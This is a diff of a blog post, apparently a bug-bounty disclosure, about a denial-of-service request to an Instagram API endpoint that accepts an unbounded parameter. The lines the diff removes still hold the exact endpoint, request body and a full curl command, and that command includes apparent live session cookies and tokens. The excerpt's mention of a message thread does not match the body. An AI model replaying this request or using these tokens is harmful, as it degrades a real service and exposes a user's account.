@@ -1,8 +1,8 @@
 ---
 layout: single
-title: Instagram - DoS via Unbounded max_number_to_display Parameter AYML API
+title: Instagram - DoS via Unbounded Parameter
 excerpt: "Denial of Service vulnerability in Instagram causing a specific message thread to become unusable. Out of scope for Meta’s bug bounty program due to available self-mitigation (e.g., deleting the thread)."
-date: 2025-07-29
+date: 2025-07-30
 classes: wide
 header:
   teaser: /img2/images/hackerone.png
@@ -17,34 +17,13 @@ tags:
   - API
 ---
 
-![](/img2/Pasted%20image%2020250729234049.png)
 
 ## Summary
 
-A POST request to the endpoint '/api/v1/discover/ayml/' on Instagram accepts a 'max_number_to_display' parameter with no apparent upper bound. By setting this parameter to an extremely large value (e.g., 9999999999), the server takes approximately 20 seconds to respond and returns a 560/566 Internal Server Error.
+A POST request to the endpoint '/api/v1/...' on Instagram accepts a 'max_number_to_display ' parameter with no apparent upper bound. By setting this parameter to an extremely large value (e.g., 9999999999), the server takes approximately 20 seconds to respond and returns a 560/566 Internal Server Error.
 
 This behavior can be reliably reproduced and may lead to a resource exhaustion or logical Denial of Service (DoS) condition. An attacker could abuse this with minimal effort to degrade performance or stability of backend components.
 
-## Steps to Reproduce
-
-- Endpoint:
-
-```
-POST https://www.instagram.com/api/v1/discover/ayml/
-```
-
-- Headers (required):
-
-```
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest
-```
-
-- Request Body:
-
-```
-max_id=%5B%5D&max_number_to_display=9999999999&module=discover_people&paginate=true
-```
 
 ## Observed Behavior
 
@@ -86,25 +65,7 @@ curl --path-as-is -i -s -k -X POST \
   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.5' \
-  -H 'Accept-Encoding: gzip, deflate, br' \
-  -H 'X-Csrftoken: o4KGwJpvN0RZ16gkpviIf86b7gHakMXU' \
-  -H 'X-Instagram-Ajax: 1025186983' \
-  -H 'X-Ig-App-Id: 936619743392459' \
-  -H 'X-Asbd-Id: 359341' \
-  -H 'X-Ig-Www-Claim: hmac.AR1AQb6TXgWPd4C48BvCGyASfCm4XqPjjOBfDXuU4qJD68p6' \
-  -H 'X-Web-Session-Id: 1pl63y:afuedo:xll9x6' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'X-Requested-With: XMLHttpRequest' \
-  -H 'Origin: https://www.instagram.com' \
-  -H 'Referer: https://www.instagram.com/explore/people/' \
-  -H 'Sec-Fetch-Dest: empty' \
-  -H 'Sec-Fetch-Mode: cors' \
-  -H 'Sec-Fetch-Site: same-origin' \
-  -H 'Te: trailers' \
-  -b 'datr=ZmaCaHRv5mShWpLhF76V6FEY; ig_did=16BBD5A7-D00B-450E-89EA-6976AAEAA051; mid=aIJmZgAEAAHV31vsZ0qp1dURspV1; wd=1886x877; csrftoken=o4KGwJpvN0RZ16gkpviIf86b7gHakMXU; sessionid=74249493484%3A2m2JqdQLvaW7ur%3A23%3AAYdFI3BENmvs-DhTggtIVqaMG9eMpWfriBiFPCuNrQ; ds_user_id=74249493484; rur="CLN\05474249493484\0541785089902:01fe120fbf1aa61b7a70f4c73f65ec48549c7b7b91f966037a7303075102815021a6fded"' \
-  --data-binary 'max_id=%5B%5D&max_number_to_display=9999999999&module=discover_people&paginate=true&jazoest=22745' \
-  'https://www.instagram.com/api/v1/discover/ayml/' \
-  -w '\nTotal time: %{time_total} seconds\n'
+...
 ```
 
 - Output 
